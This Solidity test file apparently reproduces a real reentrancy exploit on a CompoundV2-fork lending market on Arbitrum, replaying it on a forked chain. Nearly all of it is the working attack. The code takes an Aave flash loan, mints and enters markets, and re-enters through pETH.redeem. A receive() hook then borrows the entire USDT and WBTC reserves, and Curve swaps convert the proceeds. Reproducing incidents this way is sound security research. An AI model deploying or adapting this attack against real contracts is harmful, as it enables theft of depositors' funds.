// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1645742620897955842
// https://twitter.com/BlockSecTeam/status/1645744655357575170
// https://twitter.com/peckshield/status/1645742296904929280
// @TX
// https://arbiscan.io/tx/0x0e29dcf4e9b211a811caf00fc8294024867bffe4ab2819cc1625d2e9d62390af
// @Summary
// a known reentrancy issue from the forked old version of CompoundV2

interface CurvePool {
    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;
}

contract ContractTest is Test {
    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IWFTM WETH = IWFTM(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    ICErc20Delegate pUSDT = ICErc20Delegate(0xD3e323a672F6568390f29f083259debB44C41f41);
    ICErc20Delegate pWBTC = ICErc20Delegate(0x367351F854506DA9B230CbB5E47332b8E58A1863);
    ICErc20Delegate pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IUnitroller unitroller = IUnitroller(0x2130C88fd0891EA79430Fb490598a5d06bF2A545);
    CurvePool curvePool = CurvePool(0x960ea3e3C7FB317332d990873d354E18d7645590);
    Exploiter exploiter;
    uint256 nonce;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("arbitrum", 79_308_097);
        cheats.label(address(WBTC), "WBTC");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(pUSDT), "pUSDT");
        cheats.label(address(pETH), "pETH");
        cheats.label(address(pWBTC), "pWBTC");
        cheats.label(address(aaveV3), "aaveV3");
        cheats.label(address(curvePool), "curvePool");
    }

    function testExploit() external {
        payable(address(0)).transfer(address(this).balance);
        address[] memory assets = new address[](2);
        assets[0] = address(WETH);
        assets[1] = address(USDT);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 200 * 1e18;
        amounts[1] = 30_000 * 1e6;
        uint256[] memory modes = new uint[](2);
        modes[0] = 0;
        modes[1] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
        exchangeUSDTWBTC();

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        USDT.approve(address(aaveV3), type(uint256).max);
        WETH.approve(address(aaveV3), type(uint256).max);
        USDT.approve(address(pUSDT), type(uint256).max);
        WBTC.approve(address(pWBTC), type(uint256).max);

        exploiter = new Exploiter();
        WETH.transfer(address(exploiter), 100 * 1e18);
        cheats.label(address(exploiter), "exploiter");
        exploiter.mint();

        WETH.withdraw(WETH.balanceOf(address(this)));
        payable(address(pETH)).call{value: address(this).balance}("");
        pUSDT.mint(USDT.balanceOf(address(this)));
        address[] memory cTokens = new address[](2);
        cTokens[0] = address(pETH);
        cTokens[1] = address(pUSDT);
        unitroller.enterMarkets(cTokens);
        pETH.borrow(13_075_471_156_463_824_220);
        pETH.redeem(pETH.balanceOf(address(this))); // Reentrancy enter point

        exploiter.redeem();
        payable(address(WETH)).call{value: address(this).balance}("");
        return true;
    }

    receive() external payable {
        if (nonce == 2) {
            pUSDT.borrow(USDT.balanceOf(address(pUSDT)));
            pWBTC.borrow(WBTC.balanceOf(address(pWBTC)));
        }
        nonce++;
    }

    function exchangeUSDTWBTC() internal {
        USDT.approve(address(curvePool), type(uint256).max);
        WBTC.approve(address(curvePool), type(uint256).max);
        curvePool.exchange(0, 2, USDT.balanceOf(address(this)), 0);
        curvePool.exchange(1, 2, WBTC.balanceOf(address(this)), 0);
    }
}

contract Exploiter is Test {
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    ICErc20Delegate pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);

    function mint() external payable {
        WETH.withdraw(WETH.balanceOf(address(this)));
        payable(address(pETH)).call{value: address(this).balance}("");
    }

    function redeem() external payable {
        pETH.redeem(pETH.balanceOf(address(this)));
        payable(address(WETH)).call{value: address(this).balance}("");
        WETH.transfer(msg.sender, WETH.balanceOf(address(this)));
    }

    receive() external payable {}
}
